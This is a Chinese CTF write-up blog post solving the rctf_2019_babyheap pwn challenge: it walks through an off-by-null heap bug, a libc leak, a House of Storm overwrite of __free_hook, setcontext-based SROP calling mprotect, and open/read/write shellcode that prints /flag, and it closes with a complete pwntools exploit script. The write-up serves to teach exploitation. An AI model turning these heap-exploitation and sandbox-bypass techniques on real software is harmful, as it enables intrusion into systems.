<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>House of Storm + 堆SROP + orw | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>House of Storm + 堆SROP + orw</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-10T15:14:29.000Z" id="date"> 2023-04-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-12T09:16:43.801Z" id="updated"> 2023-09-12</time></div></span></div></div><hr><div id="post-content"><p><strong>同样是house of storm，但是如果程序开启了沙箱，禁用了system函数，那我们常规把hook函数改为system函数的方法就失效了，<br>若是沙箱没有禁用open，read，write函数，这里我们可以考虑用orw。</strong></p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf_2019_babyheap"></a>rctf_2019_babyheap</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>保护全开，禁用了execve就是禁用了system，因为system函数通过调用execve函数才能执行。<br>看一下ida</p>
<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p>可以看到是实现了四个功能，增改删查</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  while ( 1 )
  {
    menu();
    switch ( get_int() )
    {
      case 1:
        add();
        break;
      case 2:
        edit();
        break;
      case 3:
        delete();
        break;
      case 4:
        show();
        break;
      case 5:
        puts("See you next time!");
        exit(0);
      default:
        puts("Invalid choice!");
        break;
    }
  }
}
</code></pre>
<h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><p>可以申请最大0x1000大小的chunk，最多申请16个chunk</p>
<pre><code>unsigned __int64 add()
{
  void **v0; // rbx
  int i; // [rsp+0h] [rbp-20h]
  int size; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v4; // [rsp+8h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; *(ptrs + 2 * i) &amp;&amp; i &lt;= 15; ++i )
    ;
  if ( i == 16 )
  {
    puts("You can't");
    exit(-1);
  }
  printf("Size: ");
  size = get_int();
  if ( size &lt;= 0 || size &gt; 0x1000 )
  {
    puts("Invalid size :(");
  }
  else
  {
    *(ptrs + 4 * i + 2) = size;
    v0 = (ptrs + 16 * i);
    *v0 = calloc(size, 1uLL);
    puts("Add success :)");
  }
  return __readfsqword(0x28u) ^ v4;
}
</code></pre>
<h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><p>存在off-by-null漏洞</p>
<pre><code>unsigned __int64 edit()
{
  unsigned int v1; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )
  {
    printf("Content: ");
    *(*(ptrs + 2 * v1) + read_n(*(ptrs + 2 * v1), *(ptrs + 4 * v1 + 2))) = 0; //off-by-one
    puts("Edit success :)");
  }
  else
  {
    puts("Invalid index :(");
  }
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><pre><code>unsigned __int64 delete()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )
  {
    free(*(ptrs + 2 * v1));
    *(ptrs + 2 * v1) = 0LL;
    *(ptrs + 4 * v1 + 2) = 0;
    puts("Delete success :)");
  }
  else
  {
    puts("Invalid index :(");
  }
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<h3 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h3><pre><code>unsigned __int64 show()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )
    puts(*(ptrs + 2 * v1));
  else
    puts("Invalid index :(");
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>看了大佬的博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44145820/article/details/105709145">rctf_2019_babyheap</a>，这里对其进行详细的解析。<br class='item-img' data-src='https://img-blog.csdnimg.cn/c2a49de2eb0a492d882fd2f865cb3fd9.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/c2a49de2eb0a492d882fd2f865cb3fd9.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>程序禁用了fastbin，且能申请最大为0x1000大小的chuck，可以使用house of storm，修改free_hook的地址为shellcode，执行shellcode，这里我们需要用orw来写shellcode，并且在这之前需要用mprotect函数修改free_hook段为可读可写可执行权限。</p>
<h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><p>先把前面的写好</p>
<pre><code># coding=utf-8
from pwn import *
#sh = remote("node4.buuoj.cn", 29278)
sh = process('./rctf_2019_babyheap')
context(log_level = 'debug', arch = 'amd64', os = 'linux')
elf = ELF("./rctf_2019_babyheap")
libc = ELF('../../libc-2.23.so--64')
def dbg():
        gdb.attach(sh)
        pause()

#命令简写化
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims   :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg=lambda address,data:log.success('%s: '%(address)+hex(data))

 
def add(size):
    ru("Choice: \n")
    sl('1')
    ru("Size: ")
    sl(str(size))

def free(index):
    ru("Choice: \n")
    sl('3')
    ru("Index: ")
    sl(str(index))

def show(index):
    ru("Choice: \n")
    sl('4')
    ru("Index: ")
    sl(str(index))

def edit(index, content):
    ru("Choice: \n")
    sl('2')
    ru("Index: ")
    sl(str(index))
    ru("Content: ")
    s(content)
</code></pre>
<h3 id="首先构造堆块重叠，泄露libc基地址"><a href="#首先构造堆块重叠，泄露libc基地址" class="headerlink" title="首先构造堆块重叠，泄露libc基地址"></a>首先构造堆块重叠，泄露libc基地址</h3><p>先申请四个chunk，申请的chunk真正大小分别为0x90,0x70,0x100,0x20,<br>chunk_3是为了free前三个chunk后防止堆块合并</p>
<pre><code>add(0x80)#0
add(0x68)#1
add(0xf0)#2
add(0x18)#3
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/b273495bb0594e12a61988abd446ee94.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/b273495bb0594e12a61988abd446ee94.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>之后free chunk_0，此时因为禁用了fastbin，所以chunk_0直接进入了unsortedbin里，再利用off-by-null漏洞修改chunk_2的pre_size为0x100（chunk_0+chunk_1正好就是0x100），修改chunk_2的size为0x100，使他处于free状态。</p>
<pre><code>free(0)
payload = 'a'*0x60 + p64(0x100)
edit(1, payload)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/b4ecbc1851fb4a11b72f4961b3cb4df3.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/b4ecbc1851fb4a11b72f4961b3cb4df3.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>free chunk_2后，触发堆块前向合并，chunk_2的pre_size为是0x100,chunk_0和chunk_1加起来是0x100，就是前三个chunk合并。unsortedbin里存放着原chunk_0的起始地址。</p>
<pre><code>free(2)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/62792e0e3da5422d95259220edb7fdb8.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/62792e0e3da5422d95259220edb7fdb8.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/dd94627bad054eb4b8269b4b8e123b05.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/dd94627bad054eb4b8269b4b8e123b05.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>此时chunk_1是没有被free的，然后我们再次申请0x80（原chunk_0大小）大小的chunk，此时原chunk_1的mem区域存放着main_arena+88，因为chunk_1并没有被free，所以我们直接调用show函数即可泄露libc基地址。</p>
<pre><code>add(0x80)#0
show(1)
malloc_hook = u64(ru('\x7f').ljust(8, '\x00')) - 0x58 - 0x10
libc.address = malloc_hook - libc.sym['__malloc_hook']
system = libc.sym['system']
free_hook = libc.sym['__free_hook']
set_context = libc.symbols['setcontext']
lg('libc_base',libc.address)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/9ff831c9123540d58be264d17010621a.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/9ff831c9123540d58be264d17010621a.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/9869752c89264053a4f41e7c96e5278d.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/9869752c89264053a4f41e7c96e5278d.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<h3 id="构造unsortbin-chunk-和largebin-chunk，进行-house-of-strom"><a href="#构造unsortbin-chunk-和largebin-chunk，进行-house-of-strom" class="headerlink" title="构造unsortbin chunk 和largebin chunk，进行 house of strom"></a>构造unsortbin chunk 和largebin chunk，进行 house of strom</h3><p>先申请0x160大小的chunk，将unsortbin中残余chunk清空，之后构造unsortbin chunk 和largebin chunk的调试过程请参考我另一篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/tbsqigongzi/article/details/126185571?spm=1001.2014.3001.5502">House of storm</a><br>此时我们已以可以修改free_hook处的值了</p>
<pre><code>#---------------布置chunk-------------------------#
add(0x18)#4
add(0x508)#5
add(0x18)#6
add(0x18)#7
add(0x508)#8
add(0x18)#9
add(0x18)#10

#dbg()
#----------------准备 unsorted chunk-----------------------#	
edit(5, 'a'*0x4f0+p64(0x500))

#dbg()

free(5)
edit(4, 'a'*0x18)

#dbg()

add(0x18)#5
add(0x4d8)#11
free(5)
free(6)

#dbg()

add(0x30)#5
add(0x4e8)#6

#dbg()

#-------------------准备 large chunk-----------------------------------#
edit(8, 'a'*0x4f0+p64(0x500))
free(8)
edit(7, 'a'*0x18)
add(0x18)#8
add(0x4d8)#12
free(8)
free(9)
add(0x40)#8
#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#

#dbg()

free(6)

#dbg()

add(0x4e8)#6

#dbg()

free(6)

#dbg()

#pause()
#--------------修改他们的满足条件进行 house of strom------------------------------#
storage = free_hook
fake_chunk = storage - 0x20
payload = '\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
edit(11, payload)

#dbg()

payload = '\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)
edit(12, payload)

#dbg()

add(0x48)#6
</code></pre>
<h3 id="mprotect-shellcode"><a href="#mprotect-shellcode" class="headerlink" title="mprotect+shellcode"></a>mprotect+shellcode</h3><p>修改free_hook为set_context+53，free_hook+0x18，free_hook+0x18，shellcode1,<br>setcontext函数负责对各个寄存器进行赋值，甚至可以控制rip，对寄存器进行赋值主要从+53开始，shellcode1即为read(0, new_addr,0x1000)，new_addr即为（free_hook &amp;0xFFFFFFFFFFFFF000）free_hook所在内存页的起始位置。我们将对这里赋予可读可写可执行权限。</p>
<pre><code>new_addr =  free_hook &amp;0xFFFFFFFFFFFFF000
shellcode1 = '''
xor rdi,rdi
mov rsi,%d
mov edx,0x1000

mov eax,0
syscall

jmp rsi
''' % new_addr
edit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/61bf594dbee4483f94beaf7afa376c9d.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/61bf594dbee4483f94beaf7afa376c9d.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<p>修改前<br class='item-img' data-src='https://img-blog.csdnimg.cn/59681f7ab0f64f57a185cacaffcb4ca2.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/59681f7ab0f64f57a185cacaffcb4ca2.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>修改后<br class='item-img' data-src='https://img-blog.csdnimg.cn/6bbe06a1c4ab4168a5bcf210118afc78.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/6bbe06a1c4ab4168a5bcf210118afc78.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>我们利用pwntools里的SigreturnFrame()执行mprotect(new_addr,0x1000,7)，并将rsp跳转到<br>free_hook+0x10处，即0x00007f05935487c0，之后执行0x00007f05935487c0地址处的代码，即我们刚才写入的shellcode1，执行read(0, new_addr,0x1000)，将我们构造的第二个shellcode写入0x00007f0593548000处 ，并将rip跳转到我们写的第二个shellcode处执行。</p>
<pre><code>frame = SigreturnFrame()
frame.rsp = free_hook+0x10
frame.rdi = new_addr
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc.sym['mprotect']
edit(12, str(frame))
free(12)
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/0211f5b1b2cb415b910461947216e62e.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/0211f5b1b2cb415b910461947216e62e.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/96861fc257104349a4a906803ad96103.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/96861fc257104349a4a906803ad96103.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>利用orw构造shellcode，发送过去并执行，获得shell</p>
<pre><code>shellcode2 = '''
mov rax, 0x67616c662f ;// /flag
push rax

mov rdi, rsp ;// /flag
mov rsi, 0 ;// O_RDONLY
xor rdx, rdx ;
mov rax, 2 ;// SYS_open
syscall

mov rdi, rax ;// fd 
mov rsi,rsp  ;
mov rdx, 1024 ;// nbytes
mov rax,0 ;// SYS_read
syscall

mov rdi, 1 ;// fd 
mov rsi, rsp ;// buf
mov rdx, rax ;// count 
mov rax, 1 ;// SYS_write
syscall

mov rdi, 0 ;// error_code
mov rax, 60
syscall
'''
sl(asm(shellcode2))
itr()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/7f499b7e484a41cf8d8efde596b692d9.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/7f499b7e484a41cf8d8efde596b692d9.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code># coding=utf-8
from pwn import *
#sh = remote("node4.buuoj.cn", 29278)
sh = process('./rctf_2019_babyheap')
context(log_level = 'debug', arch = 'amd64', os = 'linux')
elf = ELF("./rctf_2019_babyheap")
libc = ELF('../../libc-2.23.so--64')
def dbg():
        gdb.attach(sh)
        pause()

#命令简写化
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims   :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg=lambda address,data:log.success('%s: '%(address)+hex(data))

 
def add(size):
    ru("Choice: \n")
    sl('1')
    ru("Size: ")
    sl(str(size))

def free(index):
    ru("Choice: \n")
    sl('3')
    ru("Index: ")
    sl(str(index))

def show(index):
    ru("Choice: \n")
    sl('4')
    ru("Index: ")
    sl(str(index))

def edit(index, content):
    ru("Choice: \n")
    sl('2')
    ru("Index: ")
    sl(str(index))
    ru("Content: ")
    s(content)

def pwn():
 
    add(0x80)#0
    add(0x68)#1
    add(0xf0)#2
    add(0x18)#3
    
    #dbg()

    free(0)
    payload = 'a'*0x60 + p64(0x100)
    edit(1, payload)
    
    #dbg()
    
    free(2)

    #dbg()

    add(0x80)#0
    show(1)
    malloc_hook = u64(ru('\x7f').ljust(8, '\x00')) - 0x58 - 0x10
    libc.address = malloc_hook - libc.sym['__malloc_hook']
    system = libc.sym['system']
    free_hook = libc.sym['__free_hook']
    set_context = libc.symbols['setcontext']
    lg('libc_base',libc.address)
    
    #dbg()
    
    add(0x160)#2

    #dbg()
    #---------------布置chunk-------------------------#
    add(0x18)#4
    add(0x508)#5
    add(0x18)#6
    add(0x18)#7
    add(0x508)#8
    add(0x18)#9
    add(0x18)#10

    #dbg()
    #----------------准备 unsorted chunk-----------------------#	
    edit(5, 'a'*0x4f0+p64(0x500))

    #dbg()

    free(5)
    edit(4, 'a'*0x18)
    
    #dbg()

    add(0x18)#5
    add(0x4d8)#11
    free(5)
    free(6)
    
    #dbg()
    
    add(0x30)#5
    add(0x4e8)#6
    
    #dbg()
    
    #-------------------准备 large chunk-----------------------------------#
    edit(8, 'a'*0x4f0+p64(0x500))
    free(8)
    edit(7, 'a'*0x18)
    add(0x18)#8
    add(0x4d8)#12
    free(8)
    free(9)
    add(0x40)#8
    #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#
    
    #dbg()
    
    free(6)
    
    #dbg()
    
    add(0x4e8)#6
    
    #dbg()
    
    free(6)

    #dbg()

    #pause()
    #--------------修改他们的满足条件进行 house of strom------------------------------#
    storage = free_hook
    fake_chunk = storage - 0x20
    payload = '\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
    edit(11, payload)

    #dbg()

    payload = '\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)
    edit(12, payload)

    #dbg()

    add(0x48)#6
    
    #dbg()

    new_addr =  free_hook &amp;0xFFFFFFFFFFFFF000
    shellcode1 = '''
    xor rdi,rdi
    mov rsi,%d
    mov edx,0x1000

    mov eax,0
    syscall

    jmp rsi
    ''' % new_addr
    edit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))

    #dbg()

    frame = SigreturnFrame()
    frame.rsp = free_hook+0x10
    frame.rdi = new_addr
    frame.rsi = 0x1000
    frame.rdx = 7
    frame.rip = libc.sym['mprotect']
    edit(12, str(frame))
    free(12)
    #dbg() 

    shellcode2 = '''
    mov rax, 0x67616c662f ;// /flag
    push rax

    mov rdi, rsp ;// /flag
    mov rsi, 0 ;// O_RDONLY
    xor rdx, rdx ;
    mov rax, 2 ;// SYS_open
    syscall

    mov rdi, rax ;// fd 
    mov rsi,rsp  ;
    mov rdx, 1024 ;// nbytes
    mov rax,0 ;// SYS_read
    syscall

    mov rdi, 1 ;// fd 
    mov rsi, rsp ;// buf
    mov rdx, rax ;// count 
    mov rax, 1 ;// SYS_write
    syscall

    mov rdi, 0 ;// error_code
    mov rax, 60
    syscall
    '''
    sl(asm(shellcode2))
    

    dbg()
    itr()
 
 
pwn()
</code></pre>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Storm/">← Next House of Storm</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/10/double%20free/">doublefree Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rctf-2019-babyheap"><span class="toc-number">1.1.</span> <span class="toc-text">rctf_2019_babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">add函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">edit函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.4.</span> <span class="toc-text">delete函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.5.</span> <span class="toc-text">show函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.6.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">调试过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E6%9E%84%E9%80%A0%E5%A0%86%E5%9D%97%E9%87%8D%E5%8F%A0%EF%BC%8C%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.1.</span> <span class="toc-text">首先构造堆块重叠，泄露libc基地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0unsortbin-chunk-%E5%92%8Clargebin-chunk%EF%BC%8C%E8%BF%9B%E8%A1%8C-house-of-strom"><span class="toc-number">1.2.2.</span> <span class="toc-text">构造unsortbin chunk 和largebin chunk，进行 house of strom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mprotect-shellcode"><span class="toc-number">1.2.3.</span> <span class="toc-text">mprotect+shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SROP"><span class="toc-number">1.2.4.</span> <span class="toc-text">SROP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ORW"><span class="toc-number">1.2.5.</span> <span class="toc-text">ORW</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>